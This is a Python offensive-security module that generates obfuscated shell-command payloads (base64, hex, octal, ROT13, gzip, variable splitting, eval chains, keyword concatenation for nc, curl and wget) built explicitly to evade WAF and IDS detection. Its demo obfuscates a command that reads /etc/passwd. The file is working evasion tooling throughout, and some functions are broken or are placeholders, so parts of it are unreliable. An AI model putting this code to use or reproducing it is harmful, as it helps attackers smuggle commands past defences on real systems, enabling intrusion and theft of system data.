#!/usr/bin/env python3
"""
Payload Obfuscation Utilities
Encode and obfuscate payloads to evade WAF/IDS detection

Techniques:
- Base64 encoding/decoding
- ROT13 cipher
- Variable splitting and concatenation
- Gzip compression
- Character encoding (hex, octal, unicode)
- Mixed obfuscation chains
"""

import base64
import binascii
import gzip
import codecs
import struct
from typing import Optional, List


class PayloadObfuscator:
    """Multi-method payload obfuscation engine"""
    
    @staticmethod
    def base64_wrap(payload: str) -> str:
        """
        Wrap payload in base64 encoding and decode on execution.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Decoded execution command
        """
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | sh"
    
    @staticmethod
    def base64_double(payload: str) -> str:
        """Double base64 encoding for extra layer"""
        encoded1 = base64.b64encode(payload.encode()).decode()
        encoded2 = base64.b64encode(encoded1.encode()).decode()
        return f"echo {encoded2} | base64 -d | base64 -d | sh"
    
    @staticmethod
    def rot13_wrap(payload: str) -> str:
        """
        ROT13 cipher - simple but often effective against basic filtering.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            ROT13 encoded execution command
        """
        rotated = codecs.encode(payload, 'rot_13')
        # The pipe command itself also needs rot13 applied to tr command
        return f"echo '{rotated}' | tr 'A-Ma-mN-Zn-z' 'N-Zn-zA-Ma-m' | sh"
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """
        Hex encode entire payload and decode via echo -e or printf.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Hex-encoded execution command
        """
        hex_str = binascii.hexlify(payload.encode()).decode()
        # Split into byte pairs for echo -e
        hex_pairs = ' '.join(['\\x' + hex_str[i:i+2] for i in range(0, len(hex_str), 2)])
        return f"echo -e '{hex_pairs}' | sh"
    
    @staticmethod
    def octal_encode(payload: str) -> str:
        """
        Octal encode payload for execution via echo -e.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Octal-encoded execution command
        """
        octal_str = ' '.join([f'\\{oct(ord(c))[2:]}' for c in payload])
        return f"echo -e '{octal_str}' | sh"
    
    @staticmethod
    def variable_split(payload: str, chunk_size: int = 4) -> str:
        """
        Split payload into variables and concatenate during execution.
        Evades signatures matching full command strings.
        
        Args:
            payload: Shell command to obfuscate
            chunk_size: Size of each chunk
            
        Returns:
            Variable-split execution command
        """
        # Split into chunks
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # Create variable declarations
        var_decls = []
        for i, chunk in enumerate(chunks):
            var_decls.append(f'_{i}="{chunk}"')
        
        # Create concatenation
        concat_parts = ' '.join(f'${{{i}}}' for i in range(len(chunks)))
        
        # Combine
        return '; '.join(var_decls) + f"; echo {concat_parts} | sh"
    
    @staticmethod
    def variable_split_eval(payload: str, chunk_size: int = 5) -> str:
        """
        Variable split with eval for detection evasion.
        
        Args:
            payload: Shell command to obfuscate
            chunk_size: Size of each chunk
            
        Returns:
            Eval-based execution command
        """
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        var_decls = ' '.join(f'x{i}="{chunk}"' for i, chunk in enumerate(chunks))
        concat = ''.join(f'$x{i}' for i in range(len(chunks)))
        return f"{var_decls}; eval \"$({concat})\""
    
    @staticmethod
    def gzip_base64(payload: str) -> str:
        """
        Gzip compress + base64 encode for small payload size.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Gzip+base64 execution command
        """
        compressed = gzip.compress(payload.encode())
        encoded = base64.b64encode(compressed).decode()
        return f"echo {encoded} | base64 -d | gunzip | sh"
    
    @staticmethod
    def unicode_escape(payload: str) -> str:
        """
        Unicode escape sequence encoding.
        Works with printf/echo -e in bash/zsh.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Unicode-escaped execution command
        """
        unicode_str = ''.join(f'\\u00{ord(c):02x}' for c in payload)
        return f"printf '{unicode_str}' | sh"
    
    @staticmethod
    def reverse_string(payload: str) -> str:
        """
        Reverse the entire payload and execute in reverse.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Reversed execution command
        """
        reversed_payload = payload[::-1]
        return f"rev <<< '{reversed_payload}' | sh"
    
    @staticmethod
    def environment_vars(payload: str) -> str:
        """
        Store payload in environment variables and reconstruct.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Environment variable execution command
        """
        # Split into lines/sections
        lines = payload.split(';')
        var_assigns = []
        var_names = []
        
        for i, line in enumerate(lines):
            var_name = f"P{i}"
            var_names.append(var_name)
            var_assigns.append(f'export {var_name}="{line}"')
        
        reconstruction = ';'.join(f'${{{var}}}' for var in var_names)
        return '; '.join(var_assigns) + f'; eval "{reconstruction}"'
    
    @staticmethod
    def mixed_chain(payload: str, methods: List[str] = None) -> str:
        """
        Apply multiple obfuscation methods in sequence.
        
        Args:
            payload: Shell command to obfuscate
            methods: List of method names to apply in order
                    (e.g., ["variable_split", "base64", "hex"])
            
        Returns:
            Multi-layer obfuscated command
        """
        if methods is None:
            methods = ["variable_split", "base64_wrap"]
        
        obfuscator = PayloadObfuscator()
        current = payload
        
        for method_name in methods:
            method = getattr(obfuscator, method_name, None)
            if method:
                current = method(current)
        
        return current
    
    @staticmethod
    def polyglot_encoding(payload: str, lang: str = "bash") -> str:
        """
        Create polyglot payloads that work in multiple shells/interpreters.
        
        Args:
            payload: Shell command to obfuscate
            lang: Target language "bash"|"zsh"|"sh"|"dash"
            
        Returns:
            Polyglot-safe execution command
        """
        if lang == "bash":
            # Use bash-specific features
            return f"bash -c 'eval \"$(echo {base64.b64encode(payload.encode()).decode()} | base64 -d)\"'"
        elif lang == "python":
            return f"python -c \"import os; os.system('{payload}')\""
        elif lang == "perl":
            return f"perl -e \"system '{payload}'\""
        else:
            # Portable version
            return f"sh -c '{payload}'"
    
    @staticmethod
    def whitespace_obfuscation(payload: str) -> str:
        """
        Insert whitespace, comments, and IFS modification to evade tokenization.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Whitespace-obfuscated command
        """
        # Insert IFS modification
        ifs = "IFS=,; "
        # Split command
        parts = payload.split()
        obfuscated = ','.join(parts)
        return f"{ifs}{obfuscated}"
    
    @staticmethod
    def command_substitution_chain(payload: str) -> str:
        """
        Use nested command substitution to hide execution.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Nested command substitution
        """
        # Wrap in multiple levels of $() substitution
        return f"$($($('echo {base64.b64encode(payload.encode()).decode()} | base64 -d')))"
    
    @staticmethod
    def null_byte_injection(payload: str) -> str:
        """
        Inject null bytes to bypass simple string matching.
        
        Args:
            payload: Shell command to obfuscate
            
        Returns:
            Null-byte-injected command
        """
        # Insert null bytes between command parts (may not work in all contexts)
        return 'echo ' + ' '.join([f"'{c}\\0'" for c in payload])
    
    @staticmethod
    def get_all_methods() -> dict:
        """Return all available obfuscation methods"""
        obfuscator = PayloadObfuscator()
        methods = {}
        
        for attr in dir(obfuscator):
            if not attr.startswith('_') and attr not in ['get_all_methods', 'mixed_chain']:
                method = getattr(obfuscator, attr)
                if callable(method):
                    methods[attr] = method
        
        return methods


class WAFBypass:
    """WAF/IDS evasion techniques"""
    
    @staticmethod
    def case_randomization(payload: str) -> str:
        """Randomize case of command names to bypass case-sensitive filters"""
        import random
        words = payload.split()
        randomized = []
        
        for word in words:
            if word.isalpha() and len(word) > 1:
                randomized.append(''.join(random.choice([c.lower(), c.upper()]) for c in word))
            else:
                randomized.append(word)
        
        return ' '.join(randomized)
    
    @staticmethod
    def concatenation_bypass(payload: str) -> str:
        """Break command into concatenated parts"""
        # Replace dangerous keywords with concatenation
        unsafe_keywords = ['nc', 'bash', 'sh', 'curl', 'wget', 'cat', 'eval']
        
        for keyword in unsafe_keywords:
            if keyword in payload:
                # Break it up: 'nc' -> 'n'+'c'
                parts = [f"'{c}'" for c in keyword]
                concat_form = '+'.join(parts)
                payload = payload.replace(keyword, f'$(echo -n {concat_form})')
        
        return payload
    
    @staticmethod
    def comment_injection(payload: str) -> str:
        """Inject comments between commands"""
        # Insert bash comments randomly
        parts = payload.split(';')
        commented = []
        
        for part in parts:
            commented.append(part + " # xyz")
        
        return '; '.join(commented)
    
    @staticmethod
    def wildcard_globbing(cmd: str) -> str:
        """Use wildcard expansion to reference binaries"""
        # e.g., /bin/c?t for /bin/cat
        # This is advanced and context-dependent
        return cmd  # Placeholder


class ObfuscationProfile:
    """Pre-built obfuscation profiles for common scenarios"""
    
    @staticmethod
    def light_obfuscation(payload: str) -> str:
        """Light obfuscation - base64 only"""
        obf = PayloadObfuscator()
        return obf.base64_wrap(payload)
    
    @staticmethod
    def medium_obfuscation(payload: str) -> str:
        """Medium obfuscation - variable split + base64"""
        obf = PayloadObfuscator()
        return obf.mixed_chain(payload, ["variable_split", "base64_wrap"])
    
    @staticmethod
    def heavy_obfuscation(payload: str) -> str:
        """Heavy obfuscation - multi-layer encoding"""
        obf = PayloadObfuscator()
        return obf.mixed_chain(payload, ["variable_split", "hex_encode", "base64_wrap"])
    
    @staticmethod
    def stealth_obfuscation(payload: str) -> str:
        """Stealth obfuscation - designed to evade WAF"""
        obf = PayloadObfuscator()
        base = obf.base64_wrap(payload)
        base = obf.variable_split(base, chunk_size=8)
        bypass = WAFBypass()
        return bypass.case_randomization(base)


if __name__ == "__main__":
    # Test obfuscation
    test_payload = "cat /etc/passwd | base64"
    
    print("Payload Obfuscation Test")
    print("=" * 60)
    print(f"Original: {test_payload}\n")
    
    obf = PayloadObfuscator()
    
    print("Methods:")
    print(f"1. Base64:        {obf.base64_wrap(test_payload)[:60]}...")
    print(f"2. ROT13:         {obf.rot13_wrap(test_payload)[:60]}...")
    print(f"3. Hex:           {obf.hex_encode(test_payload)[:60]}...")
    print(f"4. Variable:      {obf.variable_split(test_payload)[:60]}...")
    print(f"5. Gzip+B64:      {obf.gzip_base64(test_payload)[:60]}...")
    
    print("\nProfiles:")
    print(f"Light:   {ObfuscationProfile.light_obfuscation(test_payload)[:60]}...")
    print(f"Medium:  {ObfuscationProfile.medium_obfuscation(test_payload)[:60]}...")
    print(f"Heavy:   {ObfuscationProfile.heavy_obfuscation(test_payload)[:60]}...")
